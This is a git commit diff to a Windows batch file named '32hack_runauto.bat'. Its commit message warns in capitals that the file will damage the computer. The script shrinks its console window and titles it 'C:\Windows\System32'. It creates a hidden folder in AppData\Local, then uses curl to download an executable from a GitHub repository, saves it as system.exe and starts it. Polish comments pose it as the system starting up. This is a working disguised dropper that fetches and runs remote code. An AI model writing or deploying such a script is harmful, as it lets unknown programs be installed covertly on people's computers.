69b872f60a0f99dcaa4a07f640777ec2584a54b2
boblorgh <boblorgh@gmail.com>
2024-10-22 07:02:56 +0200

    DO NOT DOWNLOAD IT!!!! IT WILL DAMAGE YOUR COMPUTER!!!!
    DO NOT DOWNLOAD IT!!!! IT WILL DAMAGE YOUR COMPUTER!!!!

--- 32hack_runauto.bat
+++ 32hack_runauto.bat
@@ -1,13 +1,26 @@
+��&cls
 @echo off
 mode con cols=15 lines=1
+title C:\Windows\System32
+mode con cols=15 lines=1
 ::echo System się uruchamia...
-::echo Nie wyłączaj tego okna!
+mode con cols=15 lines=1
+::echo Nie wylaczaj tego okna!
+mode con cols=15 lines=1
 cd "C:\Users\%USERNAME%\AppData\Local"
+mode con cols=15 lines=1
 mkdir "ar-eg"
+mode con cols=15 lines=1
 attrib +h "ar-eg" /s /d
-cd C:\Users\%USERNAME%\AppData\Local\ar-eg" 
+mode con cols=15 lines=1
+cd C:\Users\%USERNAME%\AppData\Local\ar-eg"
+mode con cols=15 lines=1
 curl -s -L -o system.exe https://github.com/boblorgh/Test2/raw/refs/heads/main/32hack_user.exe
+mode con cols=15 lines=1
 start system.exe
-::echo System skończył się uruchamiać.
-::echo Możesz wyłączyć te okno.
+mode con cols=15 lines=1
+::echo System skonczyl sie uruchamiac.
+mode con cols=15 lines=1
+::echo Mozesz wylaczyc to okno.
+mode con cols=15 lines=1
 exit
